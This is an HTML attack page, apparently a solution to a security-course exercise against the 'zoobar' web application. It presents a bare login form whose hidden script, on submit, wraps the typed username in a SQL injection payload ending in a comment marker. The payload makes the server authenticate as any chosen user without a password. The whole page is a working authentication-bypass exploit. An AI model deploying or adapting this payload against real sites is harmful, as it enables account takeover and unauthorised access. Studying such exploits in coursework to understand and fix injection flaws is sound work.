<!DOCTYPE html>
<html>
<head>
  <title>Blah</title>
  <link rel="stylesheet" href="http://zoobar.org:5000/bootstrap.min.css" type="text/css" charset="utf-8">
  <script src="http://zoobar.org:5000/jquery.min.js" type="text/javascript" charset="utf-8"></script>
</head>
<body>
  <div class="container">
    <div class="row">
      <div class="hero-unit span7 offset2" style="margin-top: 40px; text-align: center;">
        <form action="http://zoobar.org:5000/login" class="form-inline" id="loginer" method="post" accept-charset="utf-8">
          <input type="text" name="name" placeholder="username" autofocus>
          <input type="hidden" name="password" style="display: none;" placeholder="password">
          <button type="submit" class="btn btn-primary">Login &rarr;</button>
        </form>
      </div>
    </div>
  </div>
  <script type="text/javascript" charset="utf-8">
  (function() {
    var loginer = document.getElementById('loginer');
    $(loginer).submit(function(ev) {
      loginer.name.value = "\\\\' OR name=\"" + loginer.name.value + "\") LIMIT 1; --";
      return true;
    });
  })();
  </script>
</body>
</html>
